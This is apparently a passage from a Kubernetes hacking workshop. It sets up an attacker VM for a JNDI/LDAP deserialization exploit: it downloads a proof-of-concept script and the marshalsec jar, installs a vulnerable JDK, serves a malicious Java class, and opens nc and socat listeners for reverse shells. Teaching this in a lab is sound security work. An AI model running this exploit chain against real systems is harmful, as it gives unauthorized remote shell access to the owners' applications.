# Prepare the attacker VMs

We also have to prepare our **attacker VM**.

Let's install an application that poses as an LDAP server and provider a Java class to the vulnerable application which will create a remote connection back to the **attacker VM**.

## Run the following commands on the attacker VM.

Login into the **attacker VM** with your favorite SSH tool as user **ec2-user**

```
export VM=attacker
PS1="\u@$VM:\w>"
```

Then we need to set the variable for the public IP address

```export PUBLIC_IP=<public ip address>```


Install python3

```sudo zypper in -y python3```

Download the app

```
wget https://github.com/bashofmann/hacking-kubernetes/raw/main/exploiting-app/poc.py
wget https://github.com/bashofmann/hacking-kubernetes/raw/main/exploiting-app/requirements.txt
mkdir ~/target
wget https://github.com/bashofmann/hacking-kubernetes/raw/main/exploiting-app/target/marshalsec-0.0.3-SNAPSHOT-all.jar -P ~/target
pip3 install -r requirements.txt
```

Download a vulnerable JDK

```
wget https://download.java.net/openjdk/jdk8u43/ri/openjdk-8u43-linux-x64.tar.gz
tar -xvf openjdk-8u43-linux-x64.tar.gz
mv java-se-8u43-ri/ jdk1.8.0_20
```

Now we can run the python app that provides the exploit

```
sudo python3 poc.py --userip ${PUBLIC_IP} --webport 80 --lport 443 &
```

And start listening for remote shells

```sudo nc -lvnp 443```

## Run the following commands on a second shell on the  attacker VM.

open a second sheel to the attacker VM and we name it **attacker2**

```
export VM2=attacker2
PS1="\u@$VM2:\w>"
```

```sudo zypper in -y socat```

```socat file:`tty`,raw,echo=0 tcp-listen:4444```
